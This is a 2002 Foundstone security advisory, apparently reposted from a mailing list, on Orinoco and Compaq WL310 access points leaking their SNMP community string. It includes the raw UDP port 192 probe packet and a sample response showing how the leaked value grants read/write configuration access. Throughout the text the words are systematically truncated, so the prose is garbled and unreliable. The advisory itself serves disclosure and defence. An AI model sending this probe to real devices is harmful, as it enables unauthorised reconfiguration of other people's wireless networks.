@@ -1,0 +1,92 @@
+[vulnwatch] foundston lab advisori - inform leakag in orinoco and compaq access pointsfoundston lab advisori - 080902-apil
+
+advisori name:	inform leakag in orinoco and compaq access point
+ releas date:	august 9th, 2002
+  applic:	orinoco residenti gatewai and compaq wl310
+    platform:	n/a
+     sever:	the abil to displai/modifi configur inform
+      vendor:	orinoco (http://www.orinocowireless.com) and
+                  compaq (http://www.compaq.com)
+      author:	marshal beddo (marshal.beddo@foundston.com)
+                  toni bettini (toni.bettini@foundston.com)
+cve candid:	can-2002-0812
+    refer:	http://www.foundston.com/advisori
+
+overview:
+
+an inform leakag vulner exist in orinoco and compaq oem 
+access point, disclos the uniqu snmp commun string. as a result,
+
+an attack can queri the commun string and gain the abil to
+chang
+system configur includ wire equival privaci (wep) kei and 
+domain name servic (dn) inform.
+
+detail descript:
+
+the compaq wl310 is an oem orinoco residenti gatewai access point.
+both the compaq and orinoco access point us a uniqu identif
+number
+found on the bottom of the access point for configur through
+their manag client. thi identif string is us as the
+default snmp read/write commun string. the commun string appear
+to be unchang, uniqu, and not easili guessabl. by send a
+specif packet to udp port 192, the access point will return
+inform includ the firmwar version and the uniqu identif
+valu. the packet return includ the valu of system.sysnam.0, which
+in the case of the compaq wl310 and orinoco residenti gatewai,
+includ
+the uniqu identif valu. the identif valu can then be
+us as the snmp commun string to view and modifi the configur.
+
+the probe packet:
+"\x01\x00\x00\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+
+exampl probe respons:
+01 01 00 00 00 00 00 00  00 00 00 00 00 00 00 00  | ................
+00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  | ................
+00 00 00 00 00 60 1d 20  2e 38 00 00 18 19 10 f8  | .....`. .8......
+4f 52 69 4e 4f 43 4f 20  52 47 2d 31 31 30 30 20  | orinoco rg-1100
+30 33 39 32 61 30 00 00  00 00 00 00 00 00 00 00  | 0392a0..........
+02 8f 24 02 52 47 2d 31  31 30 30 20 56 33 2e 38  | ..$.rg-1100 v3.8
+33 20 53 4e 2d 30 32 55  54 30 38 32 33 32 33 34  | 3 sn-02ut0823234
+32 20 56 00                                       | 2 v.
+
+system.sysnam.0 = "orinoco rg-1100 0392a0"
+commun name: 0392a0
+
+vendor respons:
+
+both vendor were notifi of thi issu on juli 8th, 2002. accord
+to orinoco, "the residenti gatewai line ha been discontinu."
+
+solut:
+
+emploi packet filter on inbound request to deni access to port
+192/udp and 161/udp on the access point.
+
+foundscan ha been updat to check for thi vulner. for more
+inform on foundscan, see the foundston websit:
+http://www.foundston.com
+
+disclaim:
+
+the inform contain in thi advisori is copyright (c) 2002 
+foundston, inc. and is believ to be accur at the time of 
+publish, but no represent of ani warranti is given, 
+express, or impli as to it accuraci or complet. in no 
+event shall the author or foundston be liabl for ani direct, 
+indirect, incident, special, exemplari or consequenti 
+damag result from the us or misus of thi inform.  
+thi advisori mai be redistribut, provid that no fee is 
+assign and that the advisori is not modifi in ani wai.
+
+
+
